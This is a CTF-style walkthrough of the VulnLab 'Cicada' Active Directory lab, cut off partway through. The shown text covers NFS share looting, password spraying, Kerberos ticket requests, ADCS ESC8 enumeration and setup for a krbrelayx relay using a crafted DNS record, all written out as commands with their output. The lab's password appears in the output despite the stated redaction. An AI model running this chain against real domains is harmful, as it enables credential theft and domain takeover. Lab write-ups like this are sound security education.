---
title: "Cicada VulnLab | Kerberos Relay & ESC8: Painfully Yours"
description: It’sMohamed Eletreby, akaMaverick, back from the dark shadows with anotherActive DirectoryandKerberosattack walkthrough! This time, we’re diving intoAD CS ESC8and if you don’t know what that is… well,
pubDate: 2025-02-28
tags:
  - Security Research
  - Red Team
  - Kerberos-Relay
  - ESC8
author: Mohamed Eletrepy (maverick)
readingTime: 18
coverImage: https://cdn-images-1.medium.com/max/800/1*8Q9KJqlCFkI2U0mRT_ezeA.png
---

---

![](https://cdn-images-1.medium.com/max/800/1*8Q9KJqlCFkI2U0mRT_ezeA.png)

*Meet the three heads of Kerberos: Authentication, Ticket Granting, and Service Tickets. Too bad they can’t stop me from relaying their treats… I mean, tickets. 🐶🎟️🔥*

### Cicada VulnLab | Kerberos Relay & ESC8: Painfully Yours

It’s **Mohamed Eletreby**, aka **Maverick**, back from the dark shadows with another **Active Directory** and **Kerberos** attack walkthrough! This time, we’re diving into **AD CS ESC8** and if you don’t know what that is… well, brace yourself. 😂 Funny enough, my **very first write-up ever** was about ESC8, and now here I am again, like a villain making a comeback. If AD CS sounds like alien tech to you, I **highly recommend** checking out my earlier articles because I’ve covered a **ton** of AD CS escalation techniques. Alright, enough talk let’s break some Kerberos!

As usual, let’s start with **scanning** to discover open ports and services, then dive deep into **enumeration** because that’s where the real magic happens. So, are you ready? 🤨 …Hello? Didn’t hear anything… Guess I’ll take that as a yes! Let’s roll.

![](https://cdn-images-1.medium.com/max/800/0*-wrAjM2wiqVuMOqs.gif)

*Me waiting for a response… but hearing nothing. Guess I’ll start the attack anyway! 😈🎭*

#### 🔍 Scanning the Battlefield Nmap in Action

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/nmap_results]  
└─# cat nmap_initial.txt  
# Nmap 7.94SVN scan initiated Fri Feb 28 08:46:35 2025 as: nmap -p- --min-rate 10000 -Pn -oN nmap_results/nmap_initial.txt 10.10.73.6  
Nmap scan report for 10.10.73.6  
Host is up (0.21s latency).  
Not shown: 65518 filtered tcp ports (no-response)  
PORT STATE SERVICE  
53/tcp open domain  
80/tcp open http  
88/tcp open kerberos-sec  
111/tcp open rpcbind  
135/tcp open msrpc  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
464/tcp open kpasswd5  
3268/tcp open globalcatLDAP  
3389/tcp open ms-wbt-server  
5985/tcp open wsman  
9389/tcp open adws  
49664/tcp open unknown  
49673/tcp open unknown  
49677/tcp open unknown  
51989/tcp open unknown  
59013/tcp open unknown  
  
# Nmap done at Fri Feb 28 08:47:03 2025 -- 1 IP address (1 host up) scanned in 28.11 seconds  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/nmap_results]  
└─# cat nmap_detailed.txt  
# Nmap 7.94SVN scan initiated Fri Feb 28 08:47:03 2025 as: nmap -p 53,80,88,111,135,139,445,464,3268,3389,5985,9389,49664,49673,49677,51989,59013 -sCV -Pn -oN nmap_results/nmap_detailed.txt 10.10.73.6  
Nmap scan report for 10.10.73.6  
Host is up (0.079s latency).  
  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open tcpwrapped  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:  
|_ Potentially risky methods: TRACE  
88/tcp open tcpwrapped  
111/tcp open tcpwrapped  
135/tcp open tcpwrapped  
139/tcp open tcpwrapped  
445/tcp open tcpwrapped  
464/tcp filtered kpasswd5  
3268/tcp open tcpwrapped  
3389/tcp open tcpwrapped  
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl  
| Not valid before: 2025-02-27T06:54:28  
|_Not valid after: 2025-08-29T06:54:28  
|_ssl-date: 2025-02-28T07:03:36+00:00; +15m42s from scanner time.  
5985/tcp open tcpwrapped  
9389/tcp open tcpwrapped  
49664/tcp open tcpwrapped  
49673/tcp open tcpwrapped  
49677/tcp filtered unknown  
51989/tcp filtered unknown  
59013/tcp filtered unknown  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2025-02-28T07:03:00  
|_ start_date: N/A  
|_clock-skew: mean: 15m41s, deviation: 0s, median: 15m40s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Fri Feb 28 08:47:55 2025 -- 1 IP address (1 host up) scanned in 51.98 seconds         
```

As usual, with an **Active Directory** machine, we’ve got the usual suspects **Kerberos, LDAP, SMB, RDP**, and more lurking in the shadows. Let’s take them on **one by one** and see what kind of trouble we can stir up. Let’s roll!

On **Active Directory** machines, I always like to **start enumeration with SMB** because you never know when a misconfigured share might spill some secrets. 😏 Time to put **NetExec** and **SMBClient** to work and see what we can dig up!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# smbclient -L //10.10.73.6/  
session setup failed: NT_STATUS_NOT_SUPPORTED
```

Well, that’s a **brick wall** right there **NT_STATUS_NOT_SUPPORTED** means ***anonymous ***SMB listing isn’t happening today. 😤 But no worries, this just makes things more interesting! Next, I’ll try **NetExec** to check for accessible shares, authentication methods, or possible user enumeration. If that doesn’t work, we’ll have to either find valid creds or pivot to another attack path. Let’s keep the grind going!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# nxc smb 10.10.104.6 -u mav -p ''  
SMB 10.10.104.6 445 10.10.104.6 [*] x64 (name:10.10.104.6) (domain:10.10.104.6) (signing:True) (SMBv1:False)  
SMB 10.10.104.6 445 10.10.104.6 [-] 10.10.104.6\mav: STATUS_NOT_SUPPORTED
```

Since **anonymous access is blocked**, and authentication with an empty password didn’t work, mounting SMB shares might also hit the same wall. But hey, no harm in trying! I’ll attempt to **manually mount the shares** using `mount -t cifs`, just in case we get lucky. If that fails, we’re likely dealing with **strict SMB authentication policies**, meaning we’ll either need valid creds or another attack vector. Time to test and adapt!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# showmount -e 10.10.73.6  
Export list for 10.10.73.6:  
/profiles (everyone)
```

Well, well, well… looks like we’ve got **NFS shares exposed!** 🎭 The `/profiles` share is accessible to *everyone*, which could mean **juicy files, misconfigurations, or even creds** hiding inside. Time to mount it and see what surprises await us! 🔥 Let’s dig in!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# mkdir share  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# sudo mount -t nfs 10.10.73.6:/profiles /home/kali/VulnLab/cicada/share  
  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# ls -la  
total 20  
drwxrwxr-x 4 root root 4096 Feb 28 09:01 .  
drwxrwxr-x 14 root root 4096 Feb 28 08:37 ..  
-rwxrwxr-x 1 root root 766 Feb 28 08:46 mavscan  
drwxrwxr-x 2 root root 4096 Feb 28 08:47 nmap_results  
drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 16:18 share  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# cd share  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/share]  
└─# ls  
Administrator Daniel.Marshall Debra.Wright Jane.Carter Jordan.Francis Joyce.Andrews Katie.Ward Megan.Simpson Richard.Gibbons Rosie.Powell Shirley.West  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/share]  
└─# ls -la  
total 14  
drwxrwxrwx+ 2 nobody nogroup 4096 Sep 15 16:18 .  
drwxrwxr-x 4 root root 4096 Feb 28 09:01 ..  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 15 16:25 Administrator  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Daniel.Marshall  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Debra.Wright  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:30 Jane.Carter  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Jordan.Francis  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Joyce.Andrews  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Katie.Ward  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Megan.Simpson  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Richard.Gibbons  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 15 16:25 Rosie.Powell  
drwxrwxrwx+ 2 nobody nogroup 64 Sep 13 18:29 Shirley.West
```

Jackpot! 🎰 The **NFS share is wide open**, and we’ve got **multiple user directories**, including an **Administrator folder**. With **full read/write permissions**, this could mean exposed credentials, SSH keys, or other sensitive files waiting for us. Time to dig into each folder and see what kind of treasure we can unearth! 🔥 Let’s go looting! 🚀

```bash
┌──(root㉿kali)-[/home/…/VulnLab/cicada/share/Administrator]  
└─# xdg-open vacation.png  
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/share/Administrator]  
└─# cd Documents  
  
┌──(root㉿kali)-[/home/…/cicada/share/Administrator/Documents]  
└─# ls  
'$RECYCLE.BIN' desktop.ini  
  
┌──(root㉿kali)-[/home/…/cicada/share/Administrator/Documents]  
└─# cat desktop.ini  
  
[.ShellClassInfo]  
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770  
IconResource=%SystemRoot%\system32\imageres.dll,-112  
IconFile=%SystemRoot%\system32\shell32.dll  
IconIndex=-235  
  
┌──(root㉿kali)-[/home/…/cicada/share/Administrator/Documents]  
└─# cd '$RECYCLE.BIN'  
  
┌──(root㉿kali)-[/home/…/share/Administrator/Documents/$RECYCLE.BIN]  
└─# ls  
desktop.ini  
  
┌──(root㉿kali)-[/home/…/share/Administrator/Documents/$RECYCLE.BIN]  
└─# cat desktop.ini  
[.ShellClassInfo]  
CLSID={645FF040-5081-101B-9F08-00AA002F954E}  
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964  
  
┌──(root㉿kali)-[/home/…/share/Administrator/Documents/$RECYCLE.BIN]  
└─#
```

After making a user list, I will need it for future attacks — because let’s be real, usernames are half the creds battle! 🏴‍☠️ While surfing through the mounted files, I found something juicy a password hidden in a photo on Rosie.Powell’s desktop. Classic mistake! Time to extract it and see where it gets us. If you’re wondering about the **desktop.ini** file inside **$RECYCLE.BIN**, it’s just a system-generated Windows configuration file. Here’s what it means: **[.ShellClassInfo]** tells Windows to apply special folder attributes, **CLSID={645FF040–5081–101B-9F08–00AA002F954E}** identifies the folder as the **Recycle Bin**, and **LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964** ensures it’s displayed correctly in different languages. **TL;DR?** It’s not useful for exploitation — it just means you’re inside the Recycle Bin. But if users recently deleted sensitive files, we might still find something spicy inside! 🔥 Time to dig for file remnants or restore deleted data if possible. 😈

![](https://cdn-images-1.medium.com/max/1200/1*_MoBjmdTEVNol04QzlWBKA.png)

*Rosie, my friend, you had one job! Never leave passwords in plain sight. But hey, your mistake is my treasure! 🏴‍☠️*

Now that we’ve got our hands on this potential password, it’s time to validate it! First, I’ll test it against SMB, WinRM, and Kerberos authentication to see if Rosie.Powell (or maybe another user) is reusing creds. If that fails, I’ll try it for password spraying across all the users I enumerated earlier. Let’s see if Rosie’s slip-up cracks this machine wide open!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# nxc ldap 10.10.104.6 -u users.txt -p 'redacted'  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [*] x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Administrator:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Daniel.Marshall:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Debra.Wright:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Jane.Carter:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Jordan.Francis:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Joyce.Andrews:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Katie.Ward:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Megan.Simpson:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Richard.Gibbons:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Shirley.West:Cicada123 STATUS_NOT_SUPPORTED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\:Cicada123 STATUS_NOT_SUPPORTED  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# nxc ldap 10.10.104.6 -u users.txt -p 'redacted' -k  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [*] x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED  
LDAP 10.10.104.6 389 DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123
```

Nice find! So, the initial LDAP authentication attempt failed with `STATUS_NOT_SUPPORTED`, but adding `-k` for Kerberos authentication got us a valid hit for Rosie.Powell with the password `<REDACTED>`. That means we now have valid domain credentials, and we can start leveraging this access for further enumeration or lateral movement. Time to see what Rosie can access!

Exactly, brother! Now that we have valid domain credentials, the next logical step is to grab a Ticket Granting Ticket (TGT) using Kerberos and see what we can access on SMB. Let’s request the ticket and then hop over to `impacket-smbclient` to explore those juicy file shares. Who knows? Maybe there's some gold hidden in there.

Because, let’s be honest — if you get valid creds and **don’t** check SMB shares, are you even hacking? 😂

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# impacket-getTGT cicada.vl/Rosie.Powell@DC-QPQ225  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
Password:  
[*] Saving ticket in Rosie.Powell@DC-QPQ225.ccache  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# export KRB5CCNAME=Rosie.Powell@DC-QPQ225.ccache  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# klist  
Ticket cache: FILE:Rosie.Powell@DC-QPQ225.ccache  
Default principal: Rosie.Powell@CICADA.VL  
  
Valid starting Expires Service principal  
02/28/2025 10:22:15 02/28/2025 20:22:15 krbtgt/CICADA.VL@CICADA.VL  
renew until 03/01/2025 10:22:11  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# impacket-smbclient cicada.vl/Rosie.Powell@DC-JPQ225 -k -no-pass  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
Type help for list of commands  
# shares  
ADMIN$  
C$  
CertEnroll  
IPC$  
NETLOGON  
profiles$  
SYSVOL  
#
```

As you can see in the SMB shares, there’s a **CertEnroll** folder — now that’s interesting! When you get **valid credentials**, there are a ton of things you should check for, like running **BloodHound** to graph the domain and uncover attack paths. Plus, it’s always worth checking for **Active Directory vulnerabilities** like **ZeroLogon, NoPac, PetitPotam**, and more. Luckily, **NetExec** can automate a lot of these checks for us. But for now, let’s focus on what’s right in front of us **CertEnroll**. This hints at an **Active Directory Certificate Services (ADCS) setup**, which could be vulnerable. Time to dig in using **Certipy** and **NetExec** to see what kind of ADCS misconfigurations we might exploit!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# nxc ldap 10.10.68.217 -u Rosie.Powell -p 'Cicada123' -k -M adcs  
  
LDAP 10.10.68.217 389 DC-JPQ225.cicada.vl [*] x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.68.217 389 DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123  
ADCS 10.10.68.217 389 DC-JPQ225.cicada.vl [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS 10.10.68.217 389 DC-JPQ225.cicada.vl Found PKI Enrollment Server: DC-JPQ225.cicada.vl  
ADCS 10.10.68.217 389 DC-JPQ225.cicada.vl Found CN: cicada-DC-JPQ225-CA
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# certipy find -u 'Rosie.Powell' -vulnerable -stdout -k -no-pass -target DC-JPQ225  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA  
[!] Got error while trying to get CA configuration for 'cicada-DC-JPQ225-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
[*] Trying to get CA configuration for 'cicada-DC-JPQ225-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Got CA configuration for 'cicada-DC-JPQ225-CA'  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : cicada-DC-JPQ225-CA  
DNS Name : DC-JPQ225.cicada.vl  
Certificate Subject : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl  
Certificate Serial Number : 4E7E07DC40A55786444976E94869A733  
Certificate Validity Start : 2025-02-28 07:37:00+00:00  
Certificate Validity End : 2525-02-28 07:47:00+00:00  
Web Enrollment : Enabled  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Permissions  
Owner : CICADA.VL\Administrators  
Access Rights  
ManageCertificates : CICADA.VL\Administrators  
CICADA.VL\Domain Admins  
CICADA.VL\Enterprise Admins  
ManageCa : CICADA.VL\Administrators  
CICADA.VL\Domain Admins  
CICADA.VL\Enterprise Admins  
Enroll : CICADA.VL\Authenticated Users  
[!] Vulnerabilities  
ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue  
Certificate Templates : [!] Could not find any certificate templates
```

And here we go — **ESC8**! Time for some **Kerberos relay exploitation**, inspired by this [research](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx). First, I’ll check if **machine account quota** allows us to add a new machine to the domain. If it does, we’re in business! There are **two ways** to pull this off: **one for Linux** (which I’ll be using) and **one for Windows**… but guess what? I **can’t** use the Windows method wanna know why? Because I have **Windows Home, like a baby**! 🥹 No Group Policy, no domain tools… just sadness. But no worries, **Linux got my back!** Let’s get to it!

![](https://cdn-images-1.medium.com/max/800/0*pI6S11oM4kg5yLY9.gif)

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada]  
└─# nxc ldap cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq  
LDAP cicada.vl 389 DC-JPQ225.cicada.vl [*] x64 (name:DC-JPQ225.cicada.vl) (domain:cicada.vl) (signing:True) (SMBv1:False)  
LDAP cicada.vl 389 DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.Powell:Cicada123  
MAQ cicada.vl 389 DC-JPQ225.cicada.vl [*] Getting the MachineAccountQuota  
MAQ cicada.vl 389 DC-JPQ225.cicada.vl MachineAccountQuota: 10
```

The **MachineAccountQuota** is set to **10**, which means we can create or join a computer to the domain! 🎯 For this, I’ll use **BloodyAD** honestly, this tool is a lifesaver in scenarios like this. Instead of dealing with complex manual LDAP modifications, **BloodyAD** simplifies the process and gets things done **fast**. Now, let’s roll and add our machine to the domain!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/bloodyAD]  
└─# ./bloodyAD.py --host dc-jpq225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -d 'cicada.vl' add dnsRecord 'dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.8.5.124  
  
[+] dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added   
```

It’s time for the relay attack, baby! I’m going to use [**krbrelayx**](https://github.com/dirkjanm/krbrelayx) from **dirjanm**, and I’ll be relaying with the [**DFSCoerce** ](https://github.com/Wh04m1001/DFSCoerce)tool. There are plenty of tools like **DFSCoerce**, but I’ll leave the search for those to you. Now, it’s attack time! 💥 But damn, I’ve had my fair share of troubleshooting with **krbrelayx**. Thankfully, a good friend sent me the key to create a **Python virtual environment** (or something like that). 😅 Let’s dive into the attack and see what we can pull off!

![](https://cdn-images-1.medium.com/max/800/0*_zgr-U7EolAT-8No)

*Big shoutout to the good man who helped me out when I hit a roadblock appreciated, truly! 🙌 If you see anyone struggling, be like him: lend a hand. It’s easy to be a good person, and helping others makes the whole journey smoother. Thanks for having my back!*

```bash
   
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python3 -m venv venv  
  
  
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# source venv/bin/activate  
  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# pip install pyOpenSSL asgiref  
  
Requirement already satisfied: pyOpenSSL in ./venv/lib/python3.12/site-packages (24.0.0)  
Collecting asgiref  
Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)  
Requirement already satisfied: cryptography<43,>=41.0.5 in ./venv/lib/python3.12/site-packages (from pyOpenSSL) (42.0.8)  
Requirement already satisfied: cffi>=1.12 in ./venv/lib/python3.12/site-packages (from cryptography<43,>=41.0.5->pyOpenSSL) (1.17.1)  
Requirement already satisfied: pycparser in ./venv/lib/python3.12/site-packages (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL) (2.22)  
Downloading asgiref-3.8.1-py3-none-any.whl (23 kB)  
Installing collected packages: asgiref  
Successfully installed asgiref-3.8.1  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python3 -m pip uninstall pyOpenSSL asgiref  
Found existing installation: pyOpenSSL 24.0.0  
Uninstalling pyOpenSSL-24.0.0:  
Would remove:  
/home/kali/VulnLab/cicada/krbrelayx/venv/lib/python3.12/site-packages/OpenSSL/*  
/home/kali/VulnLab/cicada/krbrelayx/venv/lib/python3.12/site-packages/pyOpenSSL-24.0.0.dist-info/*  
Proceed (Y/n)? y  
Successfully uninstalled pyOpenSSL-24.0.0  
Found existing installation: asgiref 3.8.1  
Uninstalling asgiref-3.8.1:  
Would remove:  
/home/kali/VulnLab/cicada/krbrelayx/venv/lib/python3.12/site-packages/asgiref-3.8.1.dist-info/*  
/home/kali/VulnLab/cicada/krbrelayx/venv/lib/python3.12/site-packages/asgiref/*  
Proceed (Y/n)? y  
Successfully uninstalled asgiref-3.8.1  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python3 -m pip install asgiref==3.7.2  
Collecting asgiref==3.7.2  
Downloading asgiref-3.7.2-py3-none-any.whl.metadata (9.2 kB)  
Downloading asgiref-3.7.2-py3-none-any.whl (24 kB)  
Installing collected packages: asgiref  
Successfully installed asgiref-3.7.2  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python3 -m pip install pyOpenSSL==22.1.0 mitmproxy-rs==0.5.1  
Collecting pyOpenSSL==22.1.0  
Using cached pyOpenSSL-22.1.0-py3-none-any.whl.metadata (8.9 kB)  
Collecting mitmproxy-rs==0.5.1  
Downloading mitmproxy_rs-0.5.1-cp310-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.2 kB)  
Collecting cryptography<39,>=38.0.0 (from pyOpenSSL==22.1.0)  
Using cached cryptography-38.0.4-cp36-abi3-manylinux_2_28_x86_64.whl.metadata (5.3 kB)  
Requirement already satisfied: cffi>=1.12 in ./venv/lib/python3.12/site-packages (from cryptography<39,>=38.0.0->pyOpenSSL==22.1.0) (1.17.1)  
Requirement already satisfied: pycparser in ./venv/lib/python3.12/site-packages (from cffi>=1.12->cryptography<39,>=38.0.0->pyOpenSSL==22.1.0) (2.22)  
Using cached pyOpenSSL-22.1.0-py3-none-any.whl (57 kB)  
Downloading mitmproxy_rs-0.5.1-cp310-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.6 MB)  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 2.5 MB/s eta 0:00:00  
Using cached cryptography-38.0.4-cp36-abi3-manylinux_2_28_x86_64.whl (4.2 MB)  
Installing collected packages: mitmproxy-rs, cryptography, pyOpenSSL  
Attempting uninstall: cryptography  
Found existing installation: cryptography 42.0.8  
Uninstalling cryptography-42.0.8:  
Successfully uninstalled cryptography-42.0.8  
Successfully installed cryptography-38.0.4 mitmproxy-rs-0.5.1 pyOpenSSL-22.1.0  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python3 krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'  
  
Traceback (most recent call last):  
File "/home/kali/VulnLab/cicada/krbrelayx/krbrelayx.py", line 45, in <module>  
from impacket.examples import logger  
ImportError: cannot import name 'logger' from 'impacket.examples' (unknown location)  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'  
  
Traceback (most recent call last):  
File "/usr/sbin/krbrelayx.py", line 45, in <module>  
from impacket.examples import logger  
ModuleNotFoundError: No module named 'impacket'  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# source venv/bin/activate  
  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# pip install impacket  
  
Collecting impacket  
Using cached impacket-0.12.0-py3-none-any.whl  
Requirement already satisfied: pyasn1>=0.2.3 in ./venv/lib/python3.12/site-packages (from impacket) (0.6.1)  
Requirement already satisfied: pyasn1_modules in ./venv/lib/python3.12/site-packages (from impacket) (0.4.1)  
Requirement already satisfied: pycryptodomex in ./venv/lib/python3.12/site-packages (from impacket) (3.21.0)  
Collecting pyOpenSSL==24.0.0 (from impacket)  
Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)  
Requirement already satisfied: six in ./venv/lib/python3.12/site-packages (from impacket) (1.17.0)  
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in ./venv/lib/python3.12/site-packages (from impacket) (2.9.1)  
Requirement already satisfied: ldapdomaindump>=0.9.0 in ./venv/lib/python3.12/site-packages (from impacket) (0.9.4)  
Requirement already satisfied: flask>=1.0 in ./venv/lib/python3.12/site-packages (from impacket) (3.1.0)  
Requirement already satisfied: setuptools in ./venv/lib/python3.12/site-packages (from impacket) (75.8.2)  
Requirement already satisfied: charset_normalizer in ./venv/lib/python3.12/site-packages (from impacket) (3.4.1)  
Collecting cryptography<43,>=41.0.5 (from pyOpenSSL==24.0.0->impacket)  
Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.3 kB)  
Requirement already satisfied: Werkzeug>=3.1 in ./venv/lib/python3.12/site-packages (from flask>=1.0->impacket) (3.1.3)  
Requirement already satisfied: Jinja2>=3.1.2 in ./venv/lib/python3.12/site-packages (from flask>=1.0->impacket) (3.1.5)  
Requirement already satisfied: itsdangerous>=2.2 in ./venv/lib/python3.12/site-packages (from flask>=1.0->impacket) (2.2.0)  
Requirement already satisfied: click>=8.1.3 in ./venv/lib/python3.12/site-packages (from flask>=1.0->impacket) (8.1.8)  
Requirement already satisfied: blinker>=1.9 in ./venv/lib/python3.12/site-packages (from flask>=1.0->impacket) (1.9.0)  
